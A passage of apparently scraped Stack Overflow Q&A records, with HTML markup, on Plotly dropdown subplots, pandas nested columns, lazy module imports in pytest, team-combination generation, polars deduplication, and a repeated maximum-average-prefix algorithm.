        fig.append_trace(go.Scatter(x=df.loc[df.name.isin([s])].time, y=df.loc[df.name.isin([s])].STDEV_1, mode='lines',name='UPPERVWAP'),1,1)
        fig.append_trace(go.Scatter(x=df.loc[df.name.isin([s])].time, y=df.loc[df.name.isin([s])].STDEV_N1, mode='lines',name='LOWERVWAP'),1,1)
        fig.append_trace(go.Scatter(x=df.loc[df.name.isin([s])].time, y=df.loc[df.name.isin([s])].KcMid, mode='lines',name='KcMid'),1,1)
        fig.append_trace(go.Scatter(x=df.loc[df.name.isin([s])].time, y=df.loc[df.name.isin([s])].KcUpper, mode='lines',name='KcUpper'),1,1)
        fig.append_trace(go.Scatter(x=df.loc[df.name.isin([s])].time, y=df.loc[df.name.isin([s])].KcLow, mode='lines',name='KcLow'),1,1)
        

        trace2 = go.Bar(
                x=df.loc[df.name.isin([s])].time,
                y=df.loc[df.name.isin([s])].volume,
                name = s)
        fig.append_trace(trace2,2,1)
        # fig.update_layout(title_text=s)
        
        
        
    graph_cnt=len(fig.data)

        
    tr = 11
    symbol_cnt =len(df.name.unique())
    for g in range(tr, graph_cnt):
        fig.update_traces(visible=False, selector=g)
        #print(g)
    def create_layout_button(k, symbol):
        
        start, end = tr*k, tr*k+2
        visibility = [False]*tr*symbol_cnt
        visibility[start:end] = [True,True,True,True,True,True,True,True,True,True,True]
        return dict(label = symbol,
                    method = 'restyle',
                    args = [{'visible': visibility[:-1],
                             'title': symbol,
                             'showlegend': False}])    
    
    fig.update(layout_xaxis_rangeslider_visible=False)
    fig.update_layout(
        updatemenus=[go.layout.Updatemenu(
            active = 0,
            buttons = [create_layout_button(k, s) for k, s in enumerate(df.name.unique())]
            )
        ])
    
    fig.show()
</code></pre>
<p>i am trying to add annotations to the figure it will be different for each chart below is how i had it setup for the single chart df['superTrend'] is a Boolean column</p>
<pre><code>for i in range(df.first_valid_index()+1,len(df.index)):
        prev = i - 1
        if df['superTrend'][i] != df['superTrend'][prev] and not np.isnan(df['superTrend'][i]) :
            #print(i,df['inUptrend'][i])
            fig.add_annotation(x=df['time'][i], y=df['open'][i],
            text= 'Buy' if df['superTrend'][i] else 'Sell',
            showarrow=True,
            arrowhead=6,
            font=dict(
                #family=&quot;Courier New, monospace&quot;,
                size=20,
                #color=&quot;#ffffff&quot;
            ),)
</code></pre>
","71155096","<p>I adapted an example from the <a href=""https://community.plotly.com/t/combining-multiple-subplots-with-drop-down-menu-buttons/49513/2"" rel=""nofollow noreferrer"">plotly community</a> to your example and created the code. The point of creation is to create the data for each subplot and then switch between them by means of buttons. The sample data is created using representative companies of US stocks. one issue is that the title is set but not displayed. We are currently investigating this issue.</p>
<pre><code>import yfinance as yf
import plotly.graph_objects as go
from plotly.subplots import make_subplots
import pandas as pd

symbols = ['AAPL','GOOG','TSLA']
stocks = pd.DataFrame()
for s in symbols:
    data = yf.download(s, start=&quot;2021-01-01&quot;, end=&quot;2021-12-31&quot;)
    data['mean'] = data['Close'].rolling(20).mean()
    data['std'] = data['Close'].rolling(20).std()
    data['upperBand'] = data['mean'] + (data['std'] * 2)
    data.reset_index(inplace=True)
    data['symbol'] = s
    stocks = stocks.append(data, ignore_index=True)

def make_multi_plot(df):
    
    fig = make_subplots(rows=2, cols=1,
                        shared_xaxes=True,
                        vertical_spacing=0.03,
                        subplot_titles=('OHLC', 'Volume Profile'),
                        row_width=[0.2, 0.7])

    for s in df.symbol.unique():
        trace1 = go.Candlestick(
            x=df.loc[df.symbol.isin([s])].Date,
            open=df.loc[df.symbol.isin([s])].Open,
            high=df.loc[df.symbol.isin([s])].High,
            low=df.loc[df.symbol.isin([s])].Low,
            close=df.loc[df.symbol.isin([s])].Close,
            name=s)
        fig.append_trace(trace1,1,1)
        
        trace2 = go.Scatter(
            x=df.loc[df.symbol.isin([s])].Date,
            y=df.loc[df.symbol.isin([s])].upperBand,
            name=s)
        fig.append_trace(trace2,1,1)
        
        trace3 = go.Bar(
            x=df.loc[df.symbol.isin([s])].Date,
            y=df.loc[df.symbol.isin([s])].Volume,
            name=s)
        fig.append_trace(trace3,2,1)
        # fig.update_layout(title_text=s)
    
    # Calculate the total number of graphs
    graph_cnt=len(fig.data)
    # Number of Symbols
    symbol_cnt =len(df.symbol.unique())
    # Number of graphs per symbol
    tr = 3
    # Hide setting for initial display
    for g in range(tr, graph_cnt): 
        fig.update_traces(visible=False, selector=g)

    def create_layout_button(k, symbol):
        start, end = tr*k, tr*k+2
        visibility = [False]*tr*symbol_cnt
        # Number of graphs per symbol, so if you add a graph, add True.
        visibility[start:end] = [True,True,True]
        return dict(label = symbol,
                    method = 'restyle',
                    args = [{'visible': visibility[:-1],
                             'title': symbol,
                             'showlegend': True}])    
    
    fig.update(layout_xaxis_rangeslider_visible=False)
    fig.update_layout(
        updatemenus=[go.layout.Updatemenu(
            active = 0,
            buttons = [create_layout_button(k, s) for k, s in enumerate(df.symbol.unique())]
            )
        ])
    
    fig.show()
    return fig.layout
    
make_multi_plot(stocks)
</code></pre>
<p><a href=""https://i.stack.imgur.com/OZLSi.png"" rel=""nofollow noreferrer""><img src=""https://i.stack.imgur.com/OZLSi.png"" alt=""enter image description here"" /></a></p>
<p><a href=""https://i.stack.imgur.com/3RMCE.png"" rel=""nofollow noreferrer""><img src=""https://i.stack.imgur.com/3RMCE.png"" alt=""enter image description here"" /></a></p>
<p><a href=""https://i.stack.imgur.com/Enh3E.png"" rel=""nofollow noreferrer""><img src=""https://i.stack.imgur.com/Enh3E.png"" alt=""enter image description here"" /></a></p>
"
"71193085","1","Creating nested columns in python dataframe","<p>I have 3 columns namely Models(should be taken as index), Accuracy without normalization, Accuracy with normalization (zscore, minmax, maxabs, robust) and these are required to be created as:</p>
<pre><code> ------------------------------------------------------------------------------------
|   Models  |  Accuracy without normalization    |      Accuracy with normalization  |
|           |                                    |-----------------------------------|
|           |                                    | zscore | minmax | maxabs | robust |
 ------------------------------------------------------------------------------------

</code></pre>
<pre><code>dfmod-&gt; Models column
dfacc-&gt; Accuracy without normalization
dfacc1-&gt; Accuracy with normalization - zscore
dfacc2-&gt; Accuracy with normalization - minmax
dfacc3-&gt; Accuracy with normalization - maxabs
dfacc4-&gt; Accuracy with normalization - robust
</code></pre>
<pre><code>dfout=pd.DataFrame({('Accuracy without Normalization'):{dfacc},
     ('Accuracy using Normalization','zscore'):{dfacc1},
     ('Accuracy using Normalization','minmax'):{dfacc2},
     ('Accuracy using Normalization','maxabs'):{dfacc3},
     ('Accuracy using Normalization','robust'):{dfacc4},
   },index=dfmod
)
</code></pre>
<p>I was trying to do something like this but i can't figure out any further</p>
<p>Test data:</p>
<pre><code>qda    0.6333       0.6917      0.5917      0.6417     0.5833
svm    0.5333       0.6917      0.5333      0.575      0.575
lda    0.5333       0.6583      0.5333      0.5667     0.5667
lr     0.5333       0.65        0.4917      0.5667     0.5667
dt     0.5333       0.65        0.4917      0.5667     0.5667
rc     0.5083       0.6333      0.4917      0.525      0.525
nb     0.5          0.625       0.475       0.5        0.4833
rfc    0.5          0.625       0.4417      0.4917     0.4583
knn    0.3917       0.6         0.4417      0.4833     0.45
et     0.375        0.5333      0.4333      0.4667     0.45
dc     0.375        0.5333      0.4333      0.4667     0.425
qds    0.3417       0.5333      0.4         0.4583     0.3667
lgt    0.3417       0.525       0.3917      0.45       0.3583
lt     0.2333       0.45        0.3917      0.4167     0.3417
</code></pre>
<p>These are values for respective subcolumns in order specified in the table above</p>
","71194341","<p>There's a dirty way to do this, I'll write about it till someone answers with a better idea. Here we go:</p>
<pre><code>import pandas as pd

# I assume that you can read raw data named test.csv by pandas and
# set header = None cause you mentioned the Test data without any headers, so:
df = pd.read_csv(&quot;test.csv&quot;, header = None)

# Then define preferred Columns! 
MyColumns = pd.MultiIndex.from_tuples([(&quot;Models&quot; , &quot;&quot;),
                                       (&quot;Accuracy without normalization&quot; , &quot;&quot;),
                                       (&quot;Accuracy with normalization&quot; , &quot;zscore&quot;),
                                       (&quot;Accuracy with normalization&quot; , &quot;minmax&quot;),
                                       (&quot;Accuracy with normalization&quot; , &quot;maxabs&quot;),
                                       (&quot;Accuracy with normalization&quot; , &quot;robust&quot;)])

# Create new DataFrame with specified Columns, after this you should pass values 
New_DataFrame = pd.DataFrame(df , columns = MyColumns)

# a loop for passing values
for item in range(len(MyColumns)):
    New_DataFrame.loc[: , MyColumns[item]] = df.iloc[: , item]
</code></pre>
<p>This gives me:</p>
<p><a href=""https://i.stack.imgur.com/8LmcK.png"" rel=""nofollow noreferrer""><img src=""https://i.stack.imgur.com/8LmcK.png"" alt=""enter image description here"" /></a></p>
<p>after all, if you want to set <code>Models</code> as the index of <code>New_DataFrame</code>, You can continue with:</p>
<pre><code>New_DataFrame.set_index(New_DataFrame.columns[0][0] , inplace=True)
New_DataFrame
</code></pre>
<p>This gives me:</p>
<p><a href=""https://i.stack.imgur.com/PuF9d.png"" rel=""nofollow noreferrer""><img src=""https://i.stack.imgur.com/PuF9d.png"" alt=""enter image description here"" /></a></p>
"
"71575112","1","Annotate a function argument as being a specific module","<p>I have a pytest fixture that imports a specific module. This is needed as importing the module is very expensive, so we don't want to do it on import-time (i.e. during pytest test collection). This results in code like this:</p>
<pre><code>@pytest.fixture
def my_module_fix():
    import my_module
    yield my_module

def test_something(my_module_fix):
    assert my_module_fix.my_func() = 5
</code></pre>
<p>I am using PyCharm and would like to have type-checking and autocompletion in my tests. To achieve that, I would somehow have to annotate the <code>my_module_fix</code> parameter as having the type of the <code>my_module</code> module.</p>
<p>I have no idea how to achieve that. All I found is that I can annotate <code>my_module_fix</code> as being of type <code>types.ModuleType</code>, but that is not enough: It is not any module, it is always <code>my_module</code>.</p>
","71680238","<p>If I get your question, you have two (or three) separate goals</p>
<ol>
<li>Deferred import of <code>slowmodule</code></li>
<li>Autocomplete to continue to work as if it was a standard import</li>
<li>(Potentially?) typing (e.g. mypy?) to continue to work</li>
</ol>
<p>I can think of at least five different approaches, though I'll only briefly mention the last because it's insane.</p>
<hr />
<h3>Import the module inside your tests</h3>
<p>This is (by far) the most common and IMHO preferred solution.</p>
<p>e.g. instead of</p>
<pre><code>import slowmodule

def test_foo():
    slowmodule.foo()

def test_bar():
    slowmodule.bar()
</code></pre>
<p>you'd write:</p>
<pre><code>def test_foo():
    import slowmodule
    slowmodule.foo()

def test_bar():
    import slowmodule
    slowmodule.bar()
</code></pre>
<ul>
<li><p><strong>[deferred importing]</strong> Here, the module will be imported on-demand/lazily.  So if you have pytest setup to fail-fast, and another test fails before pytest gets to your (<code>test_foo</code>, <code>test_bar</code>) tests, the module will never be imported and you'll never incur the runtime cost.</p>
<p>Because of Python's <a href=""https://docs.python.org/3/reference/import.html#the-module-cache"" rel=""nofollow noreferrer"">module cache</a>, subsequent import statements won't actually re-import the module, just grab a reference to the already-imported module.</p>
</li>
<li><p><strong>[autocomplete/typing]</strong> Of course, autocomplete will continue to work as you expect in this case.  This is a perfectly fine import pattern.</p>
</li>
</ul>
<p>While it does require adding potentially many additional import statements (one inside each test function), it's immediately clear what is going on (regardless of whether it's clear <em>why</em> it's going on).</p>
<hr />
<h3>[3.7+] Proxy your module with module <code>__getattr__</code></h3>
<p>If you create a module (e.g. <code>slowmodule_proxy.py</code>) with the contents like:</p>
<pre><code>def __getattr__(name):
    import slowmodule
    return getattr(slowmodule, name)
</code></pre>
<p>And in your tests, e.g.</p>
<pre><code>import slowmodule

def test_foo():
    slowmodule.foo()

def test_bar():
    slowmodule.bar()
</code></pre>
<p>instead of:</p>
<pre><code>import slowmodule
</code></pre>
<p>you write:</p>
<pre><code>import slowmodule_proxy as slowmodule
</code></pre>
<ul>
<li><p><strong>[deferred import]</strong> Thanks to <a href=""https://peps.python.org/pep-0562/"" rel=""nofollow noreferrer"">PEP-562</a>, you can &quot;request&quot; any name from <code>slowmodule_proxy</code> and it will fetch and return the corresponding name from <code>slowmodule</code>.  Just as above, including the <code>import</code> <em>inside</em> the function will cause <code>slowmodule</code> to be imported only when the function is called and executed instead of on module load.  Module caching still applies here of course, so you're only incurring the import penalty once per interpreter session.</p>
</li>
<li><p><strong>[autocomplete]</strong> However, while deferred importing will work (and your tests run without issue), this approach (as stated so far) will &quot;break&quot; autocomplete:</p>
</li>
</ul>
<p><a href=""https://i.stack.imgur.com/tI3ty.png"" rel=""nofollow noreferrer""><img src=""https://i.stack.imgur.com/tI3ty.png"" alt=""enter image description here"" /></a></p>
<p>Now we're in the realm of PyCharm.  Some IDEs will perform &quot;live&quot; analysis of modules and actually load up the module and inspect its members.  (PyDev had this option).  If PyCharm did this, implementing <code>module.__dir__</code> (same PEP) or <code>__all__</code> would allow your proxy module to masquerade as the actual <code>slowmodule</code> and autocomplete would work.†  But, PyCharm does not do this.</p>
<p>Nonetheless, you can fool PyCharm into giving you autocomplete suggestions:</p>
<pre><code>if False:
    import slowmodule
else:
    import slowmodule_proxy as slowmodule
</code></pre>
<p>The interpreter will only execute the <code>else</code> branch, importing the proxy and naming it <code>slowmodule</code> (so your test code can continue to reference <code>slowmodule</code> unchanged).</p>
<p>But PyCharm will now provide autocompletion for the underlying module:</p>
<p><a href=""https://i.stack.imgur.com/MZs3C.png"" rel=""nofollow noreferrer""><img src=""https://i.stack.imgur.com/MZs3C.png"" alt=""enter image description here"" /></a></p>
<p>† <sub>While live-analysis can be an incredibly helpful, there's also a (potential) security concern that comes with it that static syntax analysis doesn't have.  And the maturation of type hinting and stub files has made it less of an issue still.</sub></p>
<hr />
<h3>Proxy <code>slowmodule</code> explicitly</h3>
<p>If you really hated the dynamic proxy approach (or the fact that you have to fool PyCharm in this way), you could proxy the module explicitly.</p>
<p>(You'd likely only want to consider this if the <code>slowmodule</code> API is stable.)</p>
<p>If <code>slowmodule</code> has methods <code>foo</code> and <code>bar</code> you'd create a proxy module  like:</p>
<pre><code>def foo(*args, **kwargs):
    import slowmodule
    return slowmodule.foo(*args, **kwargs)

def bar(*args, **kwargs):
    import slowmodule
    return slowmodule.bar(*args, **kwargs)
</code></pre>
<p>(Using <code>args</code> and <code>kwargs</code> to pass arguments through to the underlying callables.  And you could add type hinting to these functions to mirror the <code>slowmodule</code> functions.)</p>
<p>And in your test,</p>
<pre><code>import slowmodule_proxy as slowmodule
</code></pre>
<p>Same as before.  Importing inside the method gives you the deferred importing you want and the module cache takes care of multiple import calls.</p>
<p>And since it's a real module whose contents can be statically analyzed, there's no need to &quot;fool&quot; PyCharm.</p>
<p>So the benefit of this solution is that you don't have a bizarre looking <code>if False</code> in your test imports.  This, however, comes at the (substantial) cost of having to maintain a proxy file alongside your module -- which could prove painful in the case that <code>slowmodule</code>'s API wasn't stable.</p>
<hr />
<h3>[3.5+] Use <code>importlib</code>'s LazyLoader instead of a proxy module</h3>
<p>Instead of the proxy module <code>slowmodule_proxy</code>, you could follow a pattern similar to <a href=""https://docs.python.org/3/library/importlib.html#implementing-lazy-imports"" rel=""nofollow noreferrer"">the one shown in the <code>importlib</code> docs</a></p>
<blockquote>
<pre><code>&gt;&gt;&gt; import importlib.util
&gt;&gt;&gt; import sys
&gt;&gt;&gt; def lazy_import(name):
...     spec = importlib.util.find_spec(name)
...     loader = importlib.util.LazyLoader(spec.loader)
...     spec.loader = loader
...     module = importlib.util.module_from_spec(spec)
...     sys.modules[name] = module
...     loader.exec_module(module)
...     return module
...
&gt;&gt;&gt; lazy_typing = lazy_import(&quot;typing&quot;)
&gt;&gt;&gt; #lazy_typing is a real module object,
&gt;&gt;&gt; #but it is not loaded in memory yet.
</code></pre>
</blockquote>
<p>You'd still need to fool PyCharm though, so something like:</p>
<pre><code>if False:
    import slowmodule
else:
    slowmodule = lazy_import('slowmodule')
</code></pre>
<p>would be necessary.</p>
<p>Outside of the single additional level of indirection on module member access (and the two minor version availability difference), it's not immediately clear to me what, if anything, there is to be gained from this approach over the previous proxy module method, however.</p>
<hr />
<h3>Use <code>importlib</code>'s Finder/Loader machinery to hook import (don't do this)</h3>
<p>You <em>could</em> create a custom module Finder/Loader that would (only) hook your <code>slowmodule</code> import and, instead load, for example your proxy module.</p>
<p>Then you could just import that &quot;importhook&quot; module before you imported slowmode in your tests, e.g.</p>
<pre><code>import myimporthooks
import slowmodule

def test_foo():
    ...
</code></pre>
<p>(Here, <code>myimporthooks</code> would use <code>importlib</code>'s <a href=""https://docs.python.org/3/glossary.html#term-finder"" rel=""nofollow noreferrer"">finder</a> and loader machinery to do something simlar to the <a href=""https://github.com/brettlangdon/importhook"" rel=""nofollow noreferrer""><code>importhook</code></a> package but intercept and redirect the import attempt rather than just serving as an import callback.)</p>
<p><strong>But this is crazy.</strong>  Not only is what you want (seemingly) achievable through (infinitely) more common and supported methods, but it's incredibly fragile, error-prone and, without diving into the internals of PyTest (which may mess with module loaders itself), it's hard to say whether it'd even work.</p>
"
"71697019","1","generating list of every combination without duplicates","<p>I would like to generate a list of combinations. I will try to simplify my problem to make it understandable.</p>
<p>We have 3 variables :</p>
<ul>
<li>x : number of letters</li>
<li>k : number of groups</li>
<li>n : number of letters per group</li>
</ul>
<p>I would like to generate using python a list of every possible combinations, without any duplicate knowing that : i don't care about the order of the groups and the order of the letters within a group.</p>
<p>As an example, with x = 4, k = 2, n = 2 :</p>
<pre><code># we start with 4 letters, we want to make 2 groups of 2 letters
letters = ['A','B','C','D']

# here would be a code that generate the list

# Here is the result that is very simple, only 3 combinations exist.
combos = [ ['AB', 'CD'], ['AC', 'BD'], ['AD', 'BC'] ]
</code></pre>
<p>Since I don't care about the order of or within the groups, and letters within a group, <code>['AB', 'CD']</code> and <code>['DC', 'BA']</code> is a duplicate.</p>
<p>This is a simplification of my real problem, which has those values : <code>x = 12</code>, <code>k = 4</code>, <code>n = 3</code>. I tried to use some functions from <code>itertools</code>, but with that many letters my computer freezes because it's too many combinations.</p>
<p>Another way of seeing the problem : you have 12 players, you want to make 4 teams of 3 players. What are all the possibilities ?</p>
<p>Could anyone help me to find an optimized solution to generate this list?</p>
","71699012","<p>There will certainly be more sophisticated/efficient ways of doing this, but here's an approach that works in a reasonable amount of time for your example and should be easy enough to adapt for other cases.</p>
<p>It generates unique teams and unique combinations thereof, as per your specifications.</p>
<pre class=""lang-py prettyprint-override""><code>from itertools import combinations

# this assumes that team_size * team_num == len(players) is a given
team_size = 3
team_num = 4
players = list('ABCDEFGHIJKL')
unique_teams = [set(c) for c in combinations(players, team_size)]

def duplicate_player(combo):
    &quot;&quot;&quot;Returns True if a player occurs in more than one team&quot;&quot;&quot;
    return len(set.union(*combo)) &lt; len(players)
    
result = (combo for combo in combinations(unique_teams, team_num) if not duplicate_player(combo))
</code></pre>
<p><code>result</code> is a generator that can be iterated or turned into a list with <code>list(result)</code>. On kaggle.com, it takes a minute or so to generate the whole list of all possible combinations (a total of 15400, in line with the computations by @beaker and @John Coleman in the comments). The teams are tuples of sets that look like this:</p>
<pre class=""lang-py prettyprint-override""><code>[({'A', 'B', 'C'}, {'D', 'E', 'F'}, {'G', 'H', 'I'}, {'J', 'K', 'L'}),
 ({'A', 'B', 'C'}, {'D', 'E', 'F'}, {'G', 'H', 'J'}, {'I', 'K', 'L'}),
 ({'A', 'B', 'C'}, {'D', 'E', 'F'}, {'G', 'H', 'K'}, {'I', 'J', 'L'}),
 ...
]
</code></pre>
<p>If you want, you can cast them into strings by calling <code>''.join()</code> on each of them.</p>
"
"71196661","1","What is the equivalent of `DataFrame.drop_duplicates()` from pandas in polars?","<p>What is the equivalent of <code>drop_duplicates()</code> from pandas in polars?</p>
<pre><code>import polars as pl
df = pl.DataFrame({&quot;a&quot;:[1,1,2], &quot;b&quot;:[2,2,3], &quot;c&quot;:[1,2,3]})
df
</code></pre>
<p>Output:</p>
<pre><code>shape: (3, 3)
┌─────┬─────┬─────┐
│ a   ┆ b   ┆ c   │
│ --- ┆ --- ┆ --- │
│ i64 ┆ i64 ┆ i64 │
╞═════╪═════╪═════╡
│ 1   ┆ 2   ┆ 1   │
├╌╌╌╌╌┼╌╌╌╌╌┼╌╌╌╌╌┤
│ 1   ┆ 2   ┆ 2   │
├╌╌╌╌╌┼╌╌╌╌╌┼╌╌╌╌╌┤
│ 2   ┆ 3   ┆ 3   │
└─────┴─────┴─────┘
</code></pre>
<p>Code:</p>
<pre><code>df.drop_duplicates([&quot;a&quot;, &quot;b&quot;])
</code></pre>
<p>Delivers the following error:</p>
<p>AttributeError: drop_duplicates not found</p>
","71196662","<p>The right function name is <code>.unique()</code></p>
<pre><code>import polars as pl
df = pl.DataFrame({&quot;a&quot;:[1,1,2], &quot;b&quot;:[2,2,3], &quot;c&quot;:[1,2,3]})
df.unique(subset=[&quot;a&quot;,&quot;b&quot;])
</code></pre>
<p>And this delivers the right output:</p>
<pre><code>shape: (2, 3)
┌─────┬─────┬─────┐
│ a   ┆ b   ┆ c   │
│ --- ┆ --- ┆ --- │
│ i64 ┆ i64 ┆ i64 │
╞═════╪═════╪═════╡
│ 1   ┆ 2   ┆ 1   │
├╌╌╌╌╌┼╌╌╌╌╌┼╌╌╌╌╌┤
│ 2   ┆ 3   ┆ 3   │
└─────┴─────┴─────┘
</code></pre>
"
"71287550","1","Repeatedly removing the maximum average subarray","<p>I have an array of positive integers. For example:</p>
<pre><code>[1, 7, 8, 4, 2, 1, 4]
</code></pre>
<p>A &quot;reduction operation&quot; finds the array prefix with the highest average, and deletes it. Here, an array prefix means a contiguous subarray whose left end is the start of the array, such as <code>[1]</code> or <code>[1, 7]</code> or <code>[1, 7, 8]</code> above. Ties are broken by taking the longer prefix.</p>
<pre><code>Original array:  [  1,   7,   8,   4,   2,   1,   4]

Prefix averages: [1.0, 4.0, 5.3, 5.0, 4.4, 3.8, 3.9]

-&gt; Delete [1, 7, 8], with maximum average 5.3
-&gt; New array -&gt; [4, 2, 1, 4]
</code></pre>
<p>I will repeat the reduction operation until the array is empty:</p>
<pre><code>[1, 7, 8, 4, 2, 1, 4]
^       ^
[4, 2, 1, 4]
^ ^
[2, 1, 4]
^       ^
[]
</code></pre>
<p>Now, actually performing these array modifications isn't necessary; I'm only looking for the list of lengths of prefixes that <em>would be deleted</em> by this process, for example, <code>[3, 1, 3]</code> above.</p>
<p>What is an efficient algorithm for computing these prefix lengths?</p>
<hr />
<p>The naive approach is to recompute all sums and averages from scratch in every iteration for an <code>O(n^2)</code> algorithm-- I've attached Python code for this below. I'm looking for any improvement on this approach-- most preferably, any solution below <code>O(n^2)</code>, but an algorithm with the same complexity but better constant factors would also be helpful.</p>
<p>Here are a few of the things I've tried (without success):</p>
<ol>
<li>Dynamically maintaining prefix sums, for example with a <a href=""https://en.wikipedia.org/wiki/Fenwick_tree"" rel=""noreferrer"">Binary Indexed Tree</a>. While I can easily update prefix <em>sums</em> or find a maximum prefix <em>sum</em> in <code>O(log n)</code> time, I haven't found any data structure which can update the <em>average</em>, as the denominator in the average is changing.</li>
<li>Reusing the previous 'rankings' of prefix averages-- these rankings can change, e.g. in some array, the prefix ending at index <code>5</code> may have a larger average than the prefix ending at index <code>6</code>, but after removing the first 3 elements, now the prefix ending at index <code>2</code> may have a <em>smaller</em> average than the one ending at <code>3</code>.</li>
<li>Looking for patterns in where prefixes end; for example, the rightmost element of any max average prefix is always a local maximum in the array, but it's not clear how much this helps.</li>
</ol>
<hr />
<p>This is a working Python implementation of the naive, quadratic method:</p>
<pre class=""lang-py prettyprint-override""><code>from fractions import Fraction
def find_array_reductions(nums: List[int]) -&gt; List[int]:
    &quot;&quot;&quot;Return list of lengths of max average prefix reductions.&quot;&quot;&quot;

    def max_prefix_avg(arr: List[int]) -&gt; Tuple[float, int]:
        &quot;&quot;&quot;Return value and length of max average prefix in arr.&quot;&quot;&quot;
        if len(arr) == 0:
            return (-math.inf, 0)

        best_length = 1
        best_average = Fraction(0, 1)
        running_sum = 0

        for i, x in enumerate(arr, 1):
            running_sum += x
            new_average = Fraction(running_sum, i)
            if new_average &gt;= best_average:
                best_average = new_average
                best_length = i

        return (float(best_average), best_length)

    removed_lengths = []
    total_removed = 0

    while total_removed &lt; len(nums):
        _, new_removal = max_prefix_avg(nums[total_removed:])
        removed_lengths.append(new_removal)
        total_removed += new_removal

    return removed_lengths
</code></pre>
<hr />
<p>Edit: The originally published code had a rare error with large inputs from using Python's <code>math.isclose()</code> with default parameters for floating point comparison, rather than proper fraction comparison. This has been fixed in the current code. An example of the error can be found at this <a href=""https://tio.run/##7Vprc@PGsf3OXzG1/iByDVHA4DmM5dT6sa5U5cYux99kXRZEQiSyIMAFQEnclH@77zkNgAQpyHZSN@vcutlymSLQ09OP06d7QGz39brI3Whb/vzzq1ev1A/rtFLVoky3taqTqq5UnC9VtS4eF3GVVOohLtNiB5Ei29VpkVeqLmZqXdfbanZ1VdXx4l3xkJT3WfE4XRSbq/c7KKHcVejoKPR9@6pMtklcJ8tsf1kmm@IhzVeX9Tq53MRP6Wa3uYyxPl4ll9XuLi7LeD8avdnByLJSxb0qynSV5nGmFsUyUWm@yHbLZDZ62YBdlZTVlROEfuiE3tW7RfV@F5fJ8teXRNqNPK2vtvvFutjG9fpXl/he5Po6uNrEdX1Zp5tNUm7ivBpd/m7/RqPRD@tELXZlmeRdRpeIel7VJZKgijxR93Ga7UpIIcOMMZKhtmWxKuONurhP8@Vc8jBH1HYLSea8yJYXltpVyJ2Ct@tpWi2yokrGk6mSHZOyLEpVLLBzpR7XSa4eE4W4q7rcc1FdIIObrVx5LFSb80ql02RKedhQqnF8dTdRAGSWVADaOs6Rf5UggRkVjBdXy8l0NPpTLiYvirxOnmpBSZ7tAY46WUFLmm93dWU1VoxjS91ZaiGwXk7EpDjLOmGI1ayAxra0KnJEJVd3iVoyUslTvKiz/SjND9ohVa83SZ0u1N1eAkz34tdL9dm1unu9sFRc0QVZj3XfScFdVOptGUswVZbelXG5hyNv4V2ZxBXLCl6skhxRydIP8V2apfVejeE0IBfLFtsCJijJTOviRJy6K5MHCGPfc9meU01kYaHEcLRJV@uaXqLm4EC9Q3lCQQZTd6t1E5J1XEmYUX3MarxIka64qopFympWj4jD@Y6Ehhj1mCLGq/RBSrYAGBc1PK12WV2NxmWSYdFDgpwV93WS/xE5v1c5ULH8266qN0QuDNjEy0Si2cDu4vr6og8j2VpCnReIi@q2AZIXAG6ZIMAS4TYMzNIWN0E6LARBFYOMwDeqrGOuTiHeQQJFvySs0sVaohOjsu5j@KQ6j2BfhhTmC6krx/7v8aUBYoVkD4ZuwSM0tKNU4iitqyS7n0nAiSkpzbsEdGM1ge7wSkhhg1Uydixs8Pq136AgS/IVxKQQXNu21IgcTjZ/lgHu9wtlPh019jYVjZAlcUnWZwTe71KEDuhNZjAZ@nABSlUWl6vkUHi0J3lIpErzhhOwh4rpvJCQOAZbESYEAw7nagPAMBbCWCP8scvT@6LcwB24uyw2jfYmGK2z8FP2knicR6VzA6lHre5gYesR4ACL70uoPCLjJOGoFTAG6kQ4hIShrpXjWNoYy/gahILvWjukFbnh@o5lR66llnJDjypg@eqOKe9BDq74juM6U9v2fO2L6djll6Rs/w8MYtVQqVinklxqdNzDnMCmSj8I6ljpI4TuHMQSuQ6wcDsGiSVNZitQClTsG3Y8sUXKZNp0lfv0yVLUfM60HCHQXkgquP0Yl8sZi6Vj6YfkSa13IITDEGGR11nrInZgxh5h0ZGGUhdTqeKWHM8Z50j2rEoYcpfsCwRWIrIotocGdxgkugnFIoKF58olQQiqRU2MKNviGpDdFLtcOswWBZRWNJIB6Exry6IhyLphq1ogw4LfHBeledtlEwQRrLup1EV8IRC4uENnJfKL7ai1tb@yvSRuqw1yl26zdBHTA7TeEWY40NwIeUW@03w8mY0U/gm8UatlXRSZmFKUtdgJFWLpgp6h@yXJcQHCBTeY4Ea@LnfJMn04Cty3mTpo7FJ3FKn3W2anvf/ntMImP@y2WbNNe5nQHMkFGr6N0/IxBUhpcHyXJa0T/PfJ8e7Fmy@@/Orrt99cTNTl5efqzRfqiy/Vl1@pr75WX79Vb785rImbCoVrR42HmzlGhjHq@y/oz8erZVLvylx9SLcyMEyOxr1IlOMcWZyJhzdA4i2s@vz47egBMvR9oz3DTeazoS9p@ZiBu1moA8dxl@nooOSblHwaH1QcxxcAP2sqTe61XSbZbDESHJb3sDfuxuyWEYS6sbCzAgoe0rJG1WPuOYYHczvqYVzH77BRkbP6G4Wc4QDRNMFoprpG1438YPE6zU7MaAeYqjGxXXK/yxsGaPLQDB5tmA6rmypstsRsiF5Q7LIl668zjwOZcD5HgArx6@XgGMumVp7mjbJ5/LAaw6jzTApmb6TsLHWa0dOsPsTZLjnpwYNpBQNgFxrSV5MKGrj/RF1fK/t0kx4yx5cNnef3lrInJ1J3SN@83Rvt6Pm9zpJrdVByIlTu8hw1OwctQcae2qOT28L4lhIXEoCeHJHQZLTayYDBPW2fXqunZwJ58tgzqS9@pdJn0ojQuL/i8xOfnokfwHLW/3oqrBMNkwEXBiLXW/@y@CEJ6WkEuxz2dVr9JZPReanNO5K4Vje3xwIq6jibd3BHro7rWh44EfhMwEWeOnNybolDIoeWeH1eD1xyc6Jrdjs5c@nEzCnnxHw57mk9lT817NPr/v6jcxo@U/5rZAxVH4GM/204ZPq/RSL/LIt0TX9skwF@iUo@JpEcrOqtQ9QnQ4xyQijXJ/59PDYQXJxwwuQ/pPAPksIn6s/H@pWZP1nx@UHVTdy7LU@YvUNIu6wVb@dhHqMIs1UZb9cHtpG1hNGcC7uNhwq9xzSjoar8TOnZEAZubp8Vr0oyHIlunNujJjk7IeWsNxsY4SEX8jf27eSIAhbX0/HpAE6pB7WfSnmd7P/J8RnPE6JTlEucjXAyf7o8rXyk/2HenLSuxY4bauUf8Fv1jWy0cro@nMzOonuquNU5xpHyuAnchrX07UnUT871NyBoVjeTbpGfHzNP1zQlcLQa5a6f1/jWHvJP3z4TXD5RsmexfQvBrY3P57L7M1mnlXWG9DqQpdcnugd0Uq6vrq9